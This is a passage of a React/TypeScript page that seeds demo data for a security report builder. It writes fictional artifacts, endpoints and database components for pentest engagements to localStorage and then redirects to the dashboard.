      // ── Artifacts (Knowledge Scope) ───────────────────────────────────────
      const artifacts: any[] = [
        { id: id('art'), type: 'architecture-document', scope: 'application', scopeId: 'app_zp_web', name: 'Merchant Portal Auth Flow Diagram', description: 'Visio diagram showing OAuth 2.0 and JWT verification steps.', visibility: 'internal-only', metadata: { fileName: 'auth_flow.pdf' }, uploadedAt: d(120), updatedAt: d(120) },
        { id: id('art'), type: 'scope-document', scope: 'engagement', scopeId: 'eng_cp_1', name: 'HIPAA Compliance SOW', description: 'Signed statement of work detailing the API endpoints in scope.', visibility: 'client-visible', metadata: { fileName: 'CarePlus_SOW.docx' }, uploadedAt: d(125), updatedAt: d(125) },
        { id: id('art'), type: 'walkthrough-video', scope: 'engagement', scopeId: 'eng_sm_1', name: 'WebSocket GPS Spoofing POC', description: 'Screen recording demonstrating how to stream all driver locations.', visibility: 'client-visible', metadata: { fileName: 'poc_gps.mp4', fileSize: 15400200 }, uploadedAt: d(85), updatedAt: d(85) },
      ];

      // ── Component Registry ────────────────────────────────────────────────
      const components: any[] = [
        { id: id('comp'), applicationId: 'app_zp_api', name: '/v2/payments/create', type: 'endpoint', trustZone: 'authenticated', description: 'Core payment initiation endpoint.', firstSeen: d(90), lastSeen: d(5), createdAt: d(90), updatedAt: d(5), findingIds: [] },
        { id: id('comp'), applicationId: 'app_cp_portal', name: 'Patient Record Storage', type: 'database', trustZone: 'internal', description: 'MongoDB collection storing HIPAA PHI.', firstSeen: d(120), lastSeen: d(10), createdAt: d(120), updatedAt: d(10), findingIds: [] },
        { id: id('comp'), applicationId: 'app_sm_fleet', name: 'ws://fleet.swiftmove.co/live-feed', type: 'endpoint', trustZone: 'public', description: 'Real-time WebSocket feed for GPS coords.', firstSeen: d(100), lastSeen: d(10), createdAt: d(100), updatedAt: d(10), findingIds: [] },
      ];
      const componentFindings: any[] = [];

      // ── Write to localStorage ─────────────────────────────────────────────
      const state: AppState = {
        serviceProviders: [sp],
        clients,
        applications: apps,
        engineers,
        artifacts,
        engagements: engagements as any,
        templates: templates as any,
        clientUsers: [],
        retestRequests: [],
        autoRetestResults: [],
        components,
        componentFindings,
      };

      localStorage.setItem('security_report_builder_data', JSON.stringify(state));
      setStatus('Done! Redirecting to dashboard...');
      setTimeout(() => router.push('/'), 1500);
    } catch (e) {
      setStatus(`Error: ${e}`);
    }
  }, [router]);

  return (
    <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', height: '100vh', fontFamily: 'Inter, sans-serif', gap: 16 }}>
      <div style={{ fontSize: 32 }}>⚙️</div>
      <h1 style={{ fontSize: 20, fontWeight: 600 }}>Demo Data Seeder</h1>
      <p style={{ color: '#888' }}>{status}</p>
    </div>
  );
}
